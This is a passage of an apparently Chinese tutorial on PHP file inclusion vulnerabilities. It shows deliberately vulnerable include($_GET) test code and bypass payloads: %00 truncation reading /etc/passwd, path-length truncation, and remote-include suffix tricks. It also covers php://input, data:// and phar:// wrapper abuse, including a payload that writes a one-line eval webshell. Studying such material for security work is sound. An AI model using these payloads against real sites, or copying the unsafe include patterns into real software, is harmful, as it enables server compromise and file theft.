data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"本地文件包含\"><a class=\"anchor\" href=\"#本地文件包含\">#</a> 本地文件包含</h1>\n<h2 id=\"无限制本地文件包含\"><a class=\"anchor\" href=\"#无限制本地文件包含\">#</a> 无限制本地文件包含</h2>\n<p>这种直接找我们到需要的文件路径，进行包含就行。</p>\n<p><span class=\"label\">示例</span></p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"有限制本地文件包含\"><a class=\"anchor\" href=\"#有限制本地文件包含\">#</a> 有限制本地文件包含</h2>\n<p>这种类型需要我们找到的敏感文件路径，然后<ins class=\"info\">绕过限制</ins>进行包含就行。</p>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>条件：magic_quotes_gpc = Off php 版本 &lt; 5.3.4</p>\n<p>在上面常见环境代码的后两种都得用 %00 截断</p>\n<p><span class=\"label warning\">示例</span><br />\n <code>http://www.xxx.com/xx.php?filename=../../etc/passwd%00</code></p>\n<h3 id=\"路径长度截断\"><a class=\"anchor\" href=\"#路径长度截断\">#</a> 路径长度截断</h3>\n<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096</p>\n<p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；</p>\n<p>Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id1\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtspan></p>\n</div>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h3 id=\"点号截断\"><a class=\"anchor\" href=\"#点号截断\">#</a> 点号截断</h3>\n<p>条件：windows OS，点号需要长于 256</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id2\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt</spanp>\n</div>\n<h1 id=\"远程文件包含\"><a class=\"anchor\" href=\"#远程文件包含\">#</a> 远程文件包含</h1>\n<p>PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>\n<div class=\"note info\">\n<p>allow_url_fopen = On（是否允许打开远程文件）<br />\nallow_url_include = On（是否允许 include/require 远程文件）</p>\n</div>\n<h2 id=\"无限制远程文件包含\"><a class=\"anchor\" href=\"#无限制远程文件包含\">#</a> 无限制远程文件包含</h2>\n<p>和无限制本地文件包含差不多。不再介绍（懒蛋。。）<br />\n<img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"有限制远程文件包含\"><a class=\"anchor\" href=\"#有限制远程文件包含\">#</a> 有限制远程文件包含</h2>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。</p>\n<h3 id=\"绕过姿势\"><a class=\"anchor\" href=\"#绕过姿势\">#</a> 绕过姿势</h3>\n<ol>\n<li>\n<p>问号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?</code> <br />\n<img data-src=\"image012.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>#号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23</code> <br />\n<img data-src=\"image011.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>空格 (%20) 绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20</code> <br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n</li>\n</ol>\n<h1 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h1>\n<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。</p>\n<p>支持的种类有这 12 种</p>\n<ul>\n<li>file:// — 访问本地文件系统</li>\n<li>http:// — 访问 HTTP (s) 网址</li>\n<li>ftp:// — 访问 FTP (s) URLs</li>\n<li>php:// — 访问各个输入 / 输出流（I/O streams）</li>\n<li>zlib:// — 压缩流</li>\n<li>data:// — 数据（RFC 2397）</li>\n<li>glob:// — 查找匹配的文件路径模式</li>\n<li>phar:// — PHP 归档</li>\n<li>ssh2:// — Secure Shell 2</li>\n<li>rar:// — RAR</li>\n<li>ogg:// — 音频流</li>\n<li>expect:// — 处理交互式的流</li>\n</ul>\n<h2 id=\"php-输入输出流\"><a class=\"anchor\" href=\"#php-输入输出流\">#</a> php:// 输入输出流</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h2 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h2>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p>\n<p><span class=\"label warning\">php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。</span></p>\n<p><span class=\"label success\">📣举例</span></p>\n<ol>\n<li><span class=\"label info\">php://stdin</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//open our file pointer to read from stdin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$line</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行读取</p>\n<ol start=\"2\">\n<li><span class=\"label info\">php://stdout</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$fd</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdout'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$fd</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"这是一个测试\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image019.png\" alt=\"\" /><br />\n可以看到打开了一个文件指针进行写入</p>\n<ol start=\"3\">\n<li><span class=\"label info\">php://stderr</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$stderr</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'php://stderr'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$stderr</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"lalala\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行写入</p>\n<h2 id=\"phpinput\"><a class=\"anchor\" href=\"#phpinput\">#</a> php://input</h2>\n<p>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br />\n<span class=\"label warning\">注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</span></p>\n<h3 id=\"phpinput-读取post数据\"><a class=\"anchor\" href=\"#phpinput-读取post数据\">#</a> php://input （读取 POST 数据）</h3>\n<p>碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；</p>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># 1.php文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>访问 <code>http://192.168.199.130/1.php</code> burp 抓包，添加 post 数据。</p>\n<p><span class=\"label\">结果</span></p>\n<p><img data-src=\"image021.png\" alt=\"\" /></p>\n<h3 id=\"phpinput写马\"><a class=\"anchor\" href=\"#phpinput写马\">#</a> php://input 写马</h3>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行。</p>\n<p>如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。</p>\n<p><code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> <br />\n<span class=\"lebal info\"> 图片</span></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p><span class=\"label info\">当 allow_url_include=Off 时是不行的</span></p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<h3 id=\"phpinput命令执行\"><a class=\"anchor\" href=\"#phpinput命令执行\">#</a> php://input 命令执行</h3>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；<br />\n<span class=\"lebal info\">图片</span></p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<h2 id=\"phpfilter本地磁盘文件进行读取\"><a class=\"anchor\" href=\"#phpfilter本地磁盘文件进行读取\">#</a> php://filter（本地磁盘文件进行读取）</h2>\n<p>元封装器，设计用于 &quot;数据流打开&quot; 时的 &quot;筛选过滤&quot; 应用，对本地磁盘文件进行读写。</p>\n<p>用法：<br />\n <code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code> <br />\n <code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  一样。</p>\n<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>\n<p>php://filter 参数</p>\n<table>\n    <tr>\n        <th>名称</th>\n        <th>描述</th>\n        <th>备注</th>\n    </tr>\n    <tr>\n        <td>resource=&lt;要过滤的数据流&gt;</td>\n        <td>指定了你要筛选过滤的数据流。</td>\n        <td>必选</td>\n    </tr>\n    <tr>\n        <td>read=&lt;读链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>write=&lt;写链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>&lt;；两个链的筛选列表&gt;</td>\n        <td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n        <td>&nbsp;</td>\n    </tr>\n</table>\n<p>过滤器详解<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=\"> https://blog.csdn.net/ni9htmar3/article/details/69812306#t8</span></p>\n<h2 id=\"file伪协议读取文件内容\"><a class=\"anchor\" href=\"#file伪协议读取文件内容\">#</a> file:// 伪协议 (读取文件内容)</h2>\n<p>通过 file 协议可以访问本地文件系统，读取到文件的内容</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image025.png\" alt=\"\" /></p>\n<h2 id=\"data伪协议\"><a class=\"anchor\" href=\"#data伪协议\">#</a> data:// 伪协议</h2>\n<p>数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  <code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</code></p>\n<p>data://（读取文件）<br />\n和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； <?php // 打印 \"I love PHP\" echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?></p>\n<p>注意：&lt;span style=&quot;color: rgb (121, 121, 121);&quot;&gt;&lt;?php phpinfo ();, 这类执行代码最后没有？&gt;&lt;/span &gt; 闭合；</p>\n<p>如果 php.ini 里的 allow_url_include=On（PHP &lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>payload:  <code>http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<h2 id=\"phar伪协议\"><a class=\"anchor\" href=\"#phar伪协议\">#</a> phar:// 伪协议</h2>\n<p>这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br />\n用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。<br />\n注意： PHP &gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br />\n步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token 